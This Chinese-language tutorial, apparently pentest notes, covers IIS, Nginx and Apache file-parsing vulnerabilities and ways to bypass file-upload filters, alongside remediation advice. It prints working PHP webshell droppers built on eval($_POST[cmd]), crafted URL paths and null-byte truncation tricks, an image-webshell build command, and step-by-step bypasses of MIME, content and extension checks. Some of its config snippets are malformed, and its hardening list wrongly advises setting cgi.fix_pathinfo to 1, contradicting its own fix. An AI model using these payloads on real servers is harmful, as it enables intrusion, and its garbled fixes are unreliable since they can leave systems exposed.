IIS与Nginx解析漏洞

IIS5.x-IIS6.x解析漏洞

使用iis5.x-6.x版本的服务器，大多为Windows server 2003，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。
形式：www.xxx.com/xx.asp;.jpg
原理：服务器默认不解析；后边的内容，因此xx.asp;1.jpg就被解析为asp文件了
方法一、
IIS6.0默认的可执行文件包含：
xx.asp
xx.asa
xx.cer
xx.cdx
方法二、
有一个x.asp的目录，里边包含一个图片文件也就是 x.asp/x.jpg 这个图片文件会被直接解析为asp文件
方法三、
当建立.asa、.asp格式的文件夹时，其目录下的文件都被当作asp文件来解析
方法四、
只能上传html格式，上传xx.asp;.html 进行绕过，访问的时候也访问这个路径
修补方案：做好权限设置，限制用户创建文件夹；编写正则，组织上传此类型的文件名。

IIS7.0/7.5/Nginx<8.03

IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。

形式：在默认Fast-CGI开启的状况，上传一个名字为dama.jpg，内容为<?php fputs(fopen(‘shell.php’,’w’),’<?php @eval($_POST[cmd]);?>’;?)> 的文件，然后访问dama.jpg/.php，在这个目录下就会生成一句话木马shell.php。

Ngonx<8.03空字节代码执行漏洞

影响版本：0.5.，0.6.，0.7 <= 0.7.65，0.8 <= 0.8.37

形式：Nginx 在图片中嵌入PHP代码然后访问 ma.jpg%00.php 从而来执行其中的代码。

Apache解析漏洞

Apache解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别的文件解析，就再往左判断。
比如test.php.php123，php123这个后缀是apache不可识别解析的，所以这个文件会被解析为test.php执行。但是我们要上传一个合法的后缀，test.php.rar.nihao.jpg.png（把你熟悉的后缀都写上，然后去测试哪个是合法的后缀）
配置问题也会导致漏洞：
①如果在apache的conf文件里有这样一行配置，AddHandler php5-script.php，这是只要文件名里包含.php不管文件名是哪样都会以php执行。
②如果在apache的conf文件里有这样一行配置，AddType application/x-httpd-php .jpg 即使扩展名是jpg，一样可以以php方式执行。
（这个问题在nginx一样存在，就是在配置文件cgi中设置，把某些类型当作某些类型来执行。可以当作后门形式。）

修复方案：

①apache配置文件，禁止.php.这样的文件执行，配置文件里边加入


Order Allow,Deny
Deny from all
<//Files>

②用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so

把#去掉，重启apache，在网站根目录下简历.htaccess文件，代码如下


RewriteEngine On
RewriteRule .(php.|php3.) /index.php
RewriteRule .(pHp.|pHp3.) /index.php
RewriteRule .(phP.|phP3.) /index.php
RewriteRule .(Php.|Php3.) /index.php
RewriteRule .(PHp.|PHp3.) /index.php
RewriteRule .(PhP.|PhP3.) /index.php
RewriteRule .(pHP.|pHP3.) /index.php
RewriteRule .(PHP.|PHP3.) /index.php
<//IfModule>

③其实针对这个，一般都是上传目录，你在apache配置文件中针对上传目录做一个正则，然后禁止/重写某些文件执行也是可以的。

如果在Apache中，.htaccess是可以被执行，可以被上传。尝试在.htaccess中写入

SetHandler application/x-httpd-php <//FilesMatch>
然后上传shell.jpg的木马，这样就可以被解析为PHP文件。

Nginx解析漏洞

Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。
当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。
如果开启了这个选项，那么就会触发在PHP中的如下逻辑：
PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了
形式：
xxx.com/1.jpg/1.php （1.php是不存在的）
xxx.com/1.jpg/.php
xxx.com/1.jpg%00.php
xxx.com/1.jpg%20\0.php
另外一种手法：上传一个名字为test.jpg，以下内容的文件,然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。
<?PHP fputs(fopen(‘shell.php’,’w’),’<?php eval($_POST[cmd])?>’);?>
新建图马
copy 1.jpg/b + 1.php/a 2.jpg
在论坛选择发帖，将图马上传，找到图片真是地址，访问图片地址
xxx.jpg/.php 菜刀连接，Getshell
加固策略

1. cgi.fix_pathubfi设为1
2. 图片上传目录不给执行权限
3. 禁用危险函数
4. 禁用发帖上传图片功能
5. 升级php-fpm，nginx

修复方案:

1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;
2.在Nginx配置文件中添加以下代码：
if ( $fastcgi_script_name ~ ../.php ) {
return 403;
}
到类似test.jpg/a.php的URL时，将返回403错误代码
搞培训的时候也遇到这种情况就是在apache那一块说了的，在CGI文件中添加对应的扩展名，就会让此扩展名按照相应的类型来解析，也算是一个后门。
黑名单绕过

1. xxx.php -> PHP,Php…  php空格、php3
2. 文件名大小写绕过

白名单绕过
其他

1. 在Windows环境下，dama.jpg[空格]   或  dama.jpg.  这两类文件都是不允许存在的，如果这样命名，Windows会默认取出空格和点。我们可以通过抓包，加上这样的格式来绕过黑名单，然后让系统帮我们把不合法的后缀消除
2. 绕过MIME文件类型检测
    a. 上传xxx.php，拦截数据包将MIME类型：Content-Type：application/octet-stream修改为Content-Type：image/pjpeg 就可上传成功
3. 绕过文件内容检测
    a. 上传1.jpg照片，在数据包中修改为1.php，在图片数据末尾空几个空格然后写上一句话木马的内容，上传即可进行连接。
4. 双文件上传
    a. 加一行文件名按钮，name标签不同，第一个上传图片，第二个上传木马
5. WebDAV [一种基于HTTP1.1的通信协议，扩展了一些HTTP请求方法]
    a. 抓包PUT上传
6. PHP文件修改文件头。[…这个是直接在文本文件的开头加上gif89a]
7. 00截断的条件，PHP<5.3.4,GPC=off，否则%00会被转义为\0
8. 另一种截断方式：多个/截断
    a. 条件PHP<5.0
    b. Windows 240个.或者./可以截断

linux 2038个/.可以截断
